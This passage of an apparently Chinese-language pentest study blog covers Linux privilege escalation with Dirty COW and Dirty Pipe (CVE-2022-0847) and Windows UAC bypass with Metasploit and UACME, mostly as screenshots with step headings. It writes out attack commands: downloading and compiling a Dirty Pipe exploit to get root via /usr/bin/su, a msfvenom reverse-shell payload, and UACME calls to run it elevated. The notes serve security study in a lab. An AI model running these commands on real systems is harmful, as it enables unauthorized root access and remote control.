src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150429240.png" alt="image-20230423150429240"></p><h6 id="执行-x2F-les-sh，探测到脏牛漏洞"><a href="#执行-x2F-les-sh，探测到脏牛漏洞" class="headerlink" title="执行.&#x2F;les.sh，探测到脏牛漏洞"></a>执行.&#x2F;les.sh，探测到脏牛漏洞</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150539921.png" alt="image-20230423150539921"></p><h6 id="上传脏牛的源码"><a href="#上传脏牛的源码" class="headerlink" title="上传脏牛的源码"></a>上传脏牛的源码</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150636157.png" alt="image-20230423150636157"></p><h6 id="进入shell会话，进行编译"><a href="#进入shell会话，进行编译" class="headerlink" title="进入shell会话，进行编译"></a>进入shell会话，进行编译</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150939369.png" alt="image-20230423150939369"></p><h6 id="x2F-dcow执行脚本"><a href="#x2F-dcow执行脚本" class="headerlink" title=".&#x2F;dcow执行脚本"></a>.&#x2F;dcow执行脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151037794.png" alt="image-20230423151037794"></p><h6 id="新建连接"><a href="#新建连接" class="headerlink" title="新建连接"></a>新建连接</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151132337.png" alt="image-20230423151132337"></p><h6 id="输入刚才的密码进行连接"><a href="#输入刚才的密码进行连接" class="headerlink" title="输入刚才的密码进行连接"></a>输入刚才的密码进行连接</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151215512.png" alt="image-20230423151215512"></p><h6 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151237525.png" alt="image-20230423151237525"></p><h3 id="Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe（脏管道）"><a href="#Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe（脏管道）" class="headerlink" title="#Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe（脏管道）"></a>#Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe（脏管道）</h3><p>Dirty Pipe(CVE-2022-0847)</p><p>5.8&lt;&#x3D;Linux kernel&lt;5.16.11&#x2F;5.15.25&#x2F;5.10.102</p><ul><li>wget <a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></li><li>gcc -o dirtypipez dirtypipez.c</li><li>.&#x2F;dirtypipez &#x2F;usr&#x2F;bin&#x2F;su  #具有 SUID 权限的可执行文件即可</li><li>id</li></ul><h6 id="上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件"><a href="#上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件" class="headerlink" title="上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件"></a>上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152120806.png" alt="image-20230423152120806"></p><h6 id="执行-x2F-les-sh，探针到了DirtyPipe漏洞"><a href="#执行-x2F-les-sh，探针到了DirtyPipe漏洞" class="headerlink" title="执行.&#x2F;les.sh，探针到了DirtyPipe漏洞"></a>执行.&#x2F;les.sh，探针到了DirtyPipe漏洞</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152453388.png" alt="image-20230423152453388"></p><h6 id="用traitor也探针到了"><a href="#用traitor也探针到了" class="headerlink" title="用traitor也探针到了"></a>用traitor也探针到了</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152532820.png" alt="image-20230423152532820"></p><h6 id="用beroot探针"><a href="#用beroot探针" class="headerlink" title="用beroot探针"></a>用beroot探针</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152703270.png" alt="image-20230423152703270"></p><h6 id="还可以探针suid，第三方漏洞，配置漏洞等的综合脚本"><a href="#还可以探针suid，第三方漏洞，配置漏洞等的综合脚本" class="headerlink" title="还可以探针suid，第三方漏洞，配置漏洞等的综合脚本"></a>还可以探针suid，第三方漏洞，配置漏洞等的综合脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423153129903.png" alt="image-20230423153129903"></p><h6 id="这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp"><a href="#这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp" class="headerlink" title="这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp"></a>这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423153612299.png" alt="image-20230423153612299"></p><h6 id="gcc编译执行后，因为-x2F-usr-x2F-bin-x2F-su有suid权限（其他任何具有-SUID-权限的可执行文件也可以），执行-x2F-dirtypipez-x2F-usr-x2F-bin-x2F-su获得root权限"><a href="#gcc编译执行后，因为-x2F-usr-x2F-bin-x2F-su有suid权限（其他任何具有-SUID-权限的可执行文件也可以），执行-x2F-dirtypipez-x2F-usr-x2F-bin-x2F-su获得root权限" class="headerlink" title="gcc编译执行后，因为&#x2F;usr&#x2F;bin&#x2F;su有suid权限（其他任何具有 SUID 权限的可执行文件也可以），执行.&#x2F;dirtypipez &#x2F;usr&#x2F;bin&#x2F;su获得root权限"></a>gcc编译执行后，因为&#x2F;usr&#x2F;bin&#x2F;su有suid权限（其他任何具有 SUID 权限的可执行文件也可以），执行.&#x2F;dirtypipez &#x2F;usr&#x2F;bin&#x2F;su获得root权限</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423153729538.png" alt="image-20230423153729538"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day102 权限提升-WIN本地用户&amp;BypassUAC&amp;DLL劫持&amp;引号路径&amp;服务权限</title>
      <link href="/2023/04/17/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/"/>
      <url>/2023/04/17/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422191848180.png" alt="image-20230422191848180"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、BypassUAC&amp;Dll劫持</p><p>2、不安全服务&amp;引号路径</p><h3 id="截至目前思路点总结如下："><a href="#截至目前思路点总结如下：" class="headerlink" title="#截至目前思路点总结如下："></a>#截至目前思路点总结如下：</h3><p>1.提权方法有部分适用在不同环境，当然也有通用方法</p><p>2.提权方法也有操作系统版本区分，特性决定方法利用面</p><p>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423002728711.png" alt="image-20230423002728711"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="MSF中sessions命令使用-msf-session-小红帽Like大灰狼的博客-CSDN博客"><a href="#MSF中sessions命令使用-msf-session-小红帽Like大灰狼的博客-CSDN博客" class="headerlink" title="MSF中sessions命令使用_msf session_小红帽Like大灰狼的博客-CSDN博客"></a><a href="https://blog.csdn.net/qq_44624916/article/details/128077200">MSF中sessions命令使用_msf session_小红帽Like大灰狼的博客-CSDN博客</a></h4><h4 id="➢-Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME"><a href="#➢-Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME" class="headerlink" title="➢ Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME"></a>➢ Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME</h4><h4 id="➢-Win2012-DLL劫持提权应用配合MSF-FlashFXP"><a href="#➢-Win2012-DLL劫持提权应用配合MSF-FlashFXP" class="headerlink" title="➢ Win2012-DLL劫持提权应用配合MSF-FlashFXP"></a>➢ Win2012-DLL劫持提权应用配合MSF-FlashFXP</h4><h4 id="➢-Win2012-不带引号服务路径配合MSF-MacroExpert"><a href="#➢-Win2012-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="➢ Win2012-不带引号服务路径配合MSF-MacroExpert"></a>➢ Win2012-不带引号服务路径配合MSF-MacroExpert</h4><h4 id="➢-Win2012-不安全的服务权限配合MSF-NewServices"><a href="#➢-Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="➢ Win2012-不安全的服务权限配合MSF-NewServices"></a>➢ Win2012-不安全的服务权限配合MSF-NewServices</h4></blockquote><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144235286.png" alt="image-20230422144235286"></p><h3 id="Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME"><a href="#Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME" class="headerlink" title="#Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME"></a>#Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME</h3><p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫BypassUAC</p><p>绕过项目：MSF内置(推荐)，Powershell渗透框架，UACME项目(推荐)</p><p>开启UAC和未开启UAC时,MSF默认getsystem提权影响(进程注入)</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.46.158  lport&#x3D;3333 -f exe -o msf.exe</p><h6 id="在没有开启之前成功获取system"><a href="#在没有开启之前成功获取system" class="headerlink" title="在没有开启之前成功获取system"></a>在没有开启之前成功获取system</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144610914.png" alt="image-20230422144610914"></p><h6 id="开启之后获取system失败"><a href="#开启之后获取system失败" class="headerlink" title="开启之后获取system失败"></a>开启之后获取system失败</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144728753.png" alt="image-20230422144728753"></p><h6 id="所以下面用到两个项目"><a href="#所以下面用到两个项目" class="headerlink" title="所以下面用到两个项目"></a>所以下面用到两个项目</h6><h5 id="1、MSF模块："><a href="#1、MSF模块：" class="headerlink" title="1、MSF模块："></a>1、MSF模块：</h5><ul><li><h6 id="Test-in-Win7-本地电脑-本地权限"><a href="#Test-in-Win7-本地电脑-本地权限" class="headerlink" title="-Test in Win7 本地电脑 本地权限"></a>-Test in Win7 本地电脑 本地权限</h6></li></ul><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p><p>获取成功</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144919377.png" alt="image-20230422144919377"></p><h6 id="Test-in-Win10-本地电脑-本地权限"><a href="#Test-in-Win10-本地电脑-本地权限" class="headerlink" title="-Test in Win10 本地电脑 本地权限"></a>-Test in Win10 本地电脑 本地权限</h6><h6 id="模块："><a href="#模块：" class="headerlink" title="模块："></a>模块：</h6><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145141293.png" alt="image-20230422145141293"></p><h6 id="获取失败"><a href="#获取失败" class="headerlink" title="获取失败"></a>获取失败</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145349787.png" alt="image-20230422145349787"></p><h6 id="用刚才测试win7的模块use-exploit-x2F-windows-x2F-local-x2F-bypassua进行测试，也提示失败"><a href="#用刚才测试win7的模块use-exploit-x2F-windows-x2F-local-x2F-bypassua进行测试，也提示失败" class="headerlink" title="用刚才测试win7的模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassua进行测试，也提示失败"></a>用刚才测试win7的模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassua进行测试，也提示失败</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145740521.png" alt="image-20230422145740521"></p><h6 id="所以用到use-exploit-x2F-windows-x2F-local-x2F-ask，前提是要管理员点这个是"><a href="#所以用到use-exploit-x2F-windows-x2F-local-x2F-ask，前提是要管理员点这个是" class="headerlink" title="所以用到use exploit&#x2F;windows&#x2F;local&#x2F;ask，前提是要管理员点这个是"></a>所以用到use exploit&#x2F;windows&#x2F;local&#x2F;ask，前提是要管理员点这个是</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145834773.png" alt="image-20230422145834773"></p><h6 id="上面的条件过于苛刻，所以用到其他模块use-exploit-x2F-windows-x2F-local-x2F-bypassuac-silentcleanup成功"><a href="#上面的条件过于苛刻，所以用到其他模块use-exploit-x2F-windows-x2F-local-x2F-bypassuac-silentcleanup成功" class="headerlink" title="上面的条件过于苛刻，所以用到其他模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup成功"></a>上面的条件过于苛刻，所以用到其他模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup成功</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150142016.png" alt="image-20230422150142016"></p><h6 id="本机win10-用use-exploit-x2F-windows-x2F-local-x2F-bypassuac-sluihijack"><a href="#本机win10-用use-exploit-x2F-windows-x2F-local-x2F-bypassuac-sluihijack" class="headerlink" title="本机win10 用use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack"></a>本机win10 用use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150358902.png" alt="image-20230422150358902"></p><h6 id="查看模块对应的系统"><a href="#查看模块对应的系统" class="headerlink" title="查看模块对应的系统"></a>查看模块对应的系统</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150542807.png" alt="image-20230422150542807"></p><h5 id="2、UACME项目："><a href="#2、UACME项目：" class="headerlink" title="2、UACME项目："></a>2、UACME项目：</h5><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150711821.png" alt="image-20230422150711821"></p><p>有76个方式绕过UAC</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151119151.png" alt="image-20230422151119151"></p><p>要用最新版VS studio去编译成exe文件</p><p>项目地址:<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>Akagi64.exe 41 msf1.exe</p><p>Akagi64.exe 编号 调用执行</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150951217.png" alt="image-20230422150951217"></p><h6 id="虚拟机win10"><a href="#虚拟机win10" class="headerlink" title="虚拟机win10"></a>虚拟机win10</h6><h6 id="这里成功的编号才会弹出窗口"><a href="#这里成功的编号才会弹出窗口" class="headerlink" title="这里成功的编号才会弹出窗口"></a>这里成功的编号才会弹出窗口</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151300317.png" alt="image-20230422151300317"></p><h6 id="两个执行whoami-x2F-all对比，发现Administrator权限变成高级"><a href="#两个执行whoami-x2F-all对比，发现Administrator权限变成高级" class="headerlink" title="两个执行whoami &#x2F;all对比，发现Administrator权限变成高级"></a>两个执行whoami &#x2F;all对比，发现Administrator权限变成高级</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151644812.png" alt="image-20230422151644812"></p><h6 id="下面是用这个来绕过UAC执行msf-exe"><a href="#下面是用这个来绕过UAC执行msf-exe" class="headerlink" title="下面是用这个来绕过UAC执行msf.exe"></a>下面是用这个来绕过UAC执行msf.exe</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151537087.png" alt="image-20230422151537087"></p><h6 id="msf监听，执行成功获得system权限"><a href="#msf监听，执行成功获得system权限" class="headerlink" title="msf监听，执行成功获得system权限"></a>msf监听，执行成功获得system权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151808283.png" alt="image-20230422151808283"></p><h6 id="到本地机win10，需要61编号才行"><a href="#到本地机win10，需要61编号才行" class="headerlink" title="到本地机win10，需要61编号才行"></a>到本地机win10，需要61编号才行</h6><p><img 